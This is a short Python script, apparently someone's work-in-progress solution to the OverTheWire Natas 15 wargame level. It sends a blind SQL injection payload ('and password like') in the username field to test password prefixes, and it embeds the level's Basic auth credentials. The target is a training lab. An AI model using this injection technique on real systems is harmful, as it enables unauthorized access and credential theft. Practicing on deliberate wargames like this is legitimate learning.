import requests,string,re
from bs4 import BeautifulSoup
password = ("wA")
alphanum = string.ascii_letters + string.digits
url = "http://natas15.natas.labs.overthewire.org/"
#
length = len(password)
headers = {
    'authorization': "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==",
    'cache-control': "no-cache",
    'postman-token': "a485c7b5-2c71-52cf-fa16-62c92545ecf4"
    }
querystring = {"debug":"yes","username":"natas16\" and password like \"" + password + "%"}
response = requests.request("GET", url, headers=headers, params=querystring)
c = response.text
soup = BeautifulSoup(c, "html.parser")
#finding line with content so i can print it to see how my loop is going. Is there a way to do the same thing but save as string?
samples = soup.find(id='content')
print(samples)
#concerting the list to a string to i can search it for a sub string
strsample = str(samples)
if re.search("This user exists.",strsample):
  print('Found!')
else:
  print("Not Found!")